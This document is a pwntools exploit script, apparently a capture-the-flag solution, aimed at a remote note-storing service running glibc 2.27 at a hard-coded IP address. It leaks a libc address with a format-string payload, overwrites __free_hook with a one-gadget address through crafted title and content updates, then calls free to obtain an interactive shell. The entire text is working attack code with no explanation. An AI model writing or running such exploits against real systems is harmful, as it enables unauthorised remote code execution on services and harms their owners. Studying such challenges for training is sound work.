#!/usr/bin/env python3

from pwn import *

exe = ELF("./bin")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})


#r = conn()
r = remote("139.162.160.184", 19999)

def free(title):
    r.recv()
    r.sendline("D")
    r.recvline()
    r.sendline(title)

def store(title, content):
    r.recv()
    r.sendline("S")
    r.recvline()
    r.sendline(title)
    r.recvline()
    r.sendline(content)

def format_string(title):
    r.recv()
    r.sendline("R")
    r.recv()
    r.sendline(title)

def update(title, content):
    r.recv()
    r.sendline("U")
    r.recvline()
    r.sendline(title)
    r.recvline()
    r.sendline(content)

def update_title(title, new_title):
    r.recv()
    r.sendline("M")
    r.recvline()
    r.sendline(title)
    r.recv()
    r.sendline(new_title)

def main():

    store("MAHER", "%46$p %47$p+%45$p")
    format_string("MAHER")
    r.recvuntil("+")
    leak = int(r.recv(14), 16)
    log.warn("Libc leak @ 0x%x", leak)
    libc.address = leak - libc.sym['__libc_start_main'] - 231
    log.warn("Libc base @ 0x%x", libc.address)
    store("FUCK", "MAERR")
    
    update("FUCK", p64(libc.sym['__free_hook']-0x8 >> 8))
    update_title("FUCK", b"M"*8 + p8(0xe0))
    update("M"*8, b"M"*8 + p64(libc.address + 0x4f432))

    free("M"*8)
    

    r.interactive()


if __name__ == "__main__":
    main()
